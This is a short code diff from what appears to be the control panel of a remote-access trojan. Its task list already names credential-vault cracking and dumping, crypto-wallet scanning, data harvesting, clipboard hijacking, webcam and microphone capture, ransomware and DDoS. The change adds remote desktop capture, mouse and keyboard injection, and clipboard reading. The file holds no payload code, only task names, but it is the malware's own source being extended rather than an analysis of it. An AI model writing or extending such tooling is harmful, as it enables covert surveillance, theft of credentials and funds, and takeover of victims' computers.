@@ -14,7 +14,7 @@ export { versionAtLeast } from '../../server/lib/agent-compat';
 export type TaskName =
   | 'shell' | 'file_pull' | 'crack_vault' | 'dump_vault' | 'scan_wallets'
   | 'harvest' | 'screenshot' | 'clip_start' | 'clip_stop' | 'clip_set' | 'cancel' | 'agent'
-  | 'monitor' | 'files' | 'webcam' | 'webcam:snapshot' | 'webcam:stream' | 'webcam:devices' | 'mic' | 'mic:record' | 'ransomware' | 'ddos';
+  | 'monitor' | 'files' | 'webcam' | 'webcam:snapshot' | 'webcam:stream' | 'webcam:devices' | 'mic' | 'mic:record' | 'desktop:frame' | 'desktop:screens' | 'input:mouse' | 'input:key' | 'clipboard:get' | 'ransomware' | 'ddos';
 
 export type ActionGroupId =
   | 'sesion' | 'energia' | 'opciones' | 'extra' | 'credenciales'
